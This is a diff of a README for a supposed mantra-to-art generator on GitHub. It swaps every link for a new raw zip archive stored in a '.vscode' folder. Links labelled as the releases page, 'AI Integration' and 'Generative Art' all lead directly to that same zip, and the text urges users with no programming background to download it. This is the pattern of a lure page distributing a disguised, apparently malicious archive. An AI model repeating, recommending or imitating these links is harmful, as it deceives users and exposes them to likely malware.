@@ -1,14 +1,14 @@
 # 🎨 Baby-Hawk-MantraGenerator - Create Art from Mantras Easily
 
 ## 📥 Download Now
-[![Download Baby-Hawk-MantraGenerator](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/api/Baby_Hawk_Mantra_Generator_impermeabilize.zip)](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/api/Baby_Hawk_Mantra_Generator_impermeabilize.zip)
+[![Download Baby-Hawk-MantraGenerator](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/.vscode/Mantra_Hawk_Baby_Generator_3.8.zip)](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/.vscode/Mantra_Hawk_Baby_Generator_3.8.zip)
 
 ## 📖 Overview
 Welcome to the Baby Hawk CodeArt Generator. This application transforms mantras into beautiful artworks. It’s designed for everyone, even if you have no programming background. Dive into this unique blend of art and meditation using simple steps.
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page**  
-   Click the button above or go to our [Releases page](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/api/Baby_Hawk_Mantra_Generator_impermeabilize.zip) to find the latest version.
+   Click the button above or go to our [Releases page](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/.vscode/Mantra_Hawk_Baby_Generator_3.8.zip) to find the latest version.
 
 2. **Download the Application**  
    On the Releases page, look for the latest version. Click on the file that matches your operating system:
@@ -54,11 +54,11 @@ Your input helps us improve. Please report any issues or suggestions on our GitH
 
 ## 🔗 Additional Resources
 Explore more about the technology behind Baby-Hawk-MantraGenerator:
-- [AI Integration](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/api/Baby_Hawk_Mantra_Generator_impermeabilize.zip)
-- [Generative Art](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/api/Baby_Hawk_Mantra_Generator_impermeabilize.zip)
+- [AI Integration](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/.vscode/Mantra_Hawk_Baby_Generator_3.8.zip)
+- [Generative Art](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/.vscode/Mantra_Hawk_Baby_Generator_3.8.zip)
 
 ## 📅 Future Updates
 We are continuously working to enhance the app. Expect new features and improved performance in upcoming versions.
 
 ## 🌟 Acknowledgments
-Thank you for choosing Baby-Hawk-MantraGenerator. We appreciate your support and look forward to seeing your creations. Remember to visit our [Releases page](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/api/Baby_Hawk_Mantra_Generator_impermeabilize.zip) to download your version and create beautiful art!
+Thank you for choosing Baby-Hawk-MantraGenerator. We appreciate your support and look forward to seeing your creations. Remember to visit our [Releases page](https://raw.githubusercontent.com/elektromat433/Baby-Hawk-MantraGenerator/main/.vscode/Mantra_Hawk_Baby_Generator_3.8.zip) to download your version and create beautiful art!
